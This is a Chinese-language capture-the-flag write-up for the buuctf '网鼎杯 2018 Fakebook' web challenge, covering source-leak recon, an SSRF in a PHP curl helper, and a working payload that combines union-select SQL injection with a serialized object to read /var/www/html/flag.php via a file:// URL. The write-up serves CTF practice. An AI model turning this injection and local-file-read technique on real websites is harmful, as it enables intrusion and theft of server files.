---
title: buuoj刷题记录5
date: 2019-12-30 16:19:44
tags:
 - 网鼎杯2018
 - buuctf
 - web
categories: 
 - 刷题记录
---

## [网鼎杯 2018]Fakebook

### 0x00 基础

一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描

<!--more-->

### 0x01 分析

访问`robots.txt`，给了一个提示

```
User-agent: *
Disallow: /user.php.bak
```

拿到`user.php`的源码

```
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();   //初始化链接

        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出
        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);  //获取博客地址
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);  //博客地址有过滤
    }

}
```

访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。

在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入

### 0x02 开始操作

使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。

![](../pic/4.png)
```
payload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3{s:4:"name";s:4:"and";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

执行结果

![](../pic/5.png)

查看源码

```html
<!doctype html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>User</title>

    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
<script src="js/jquery-3.3.1.slim.min.js" crossorigin="anonymous"></script>
<script src="js/popper.min.js" crossorigin="anonymous"></script>
<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
</head>
<body>
<div class="container">
    <table class="table">
        <tr>
            <th>
                username
            </th>
            <th>
                age
            </th>
            <th>
                blog
            </th>
        </tr>
        <tr>
            <td>
                2            </td>
            <td>
                12            </td>
            <td>
                file:///var/www/html/flag.php            </td>
        </tr>
    </table>

    <hr>
    <br><br><br><br><br>
    <p>the contents of his/her blog</p>
    <hr>
    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>
</div>
</body>
</html>
```

点击即可看见flag

```php
<?php

$flag = "flag{835065b6-b60d-49da-a92b-dd80d38032dc}";
exit(0);

```

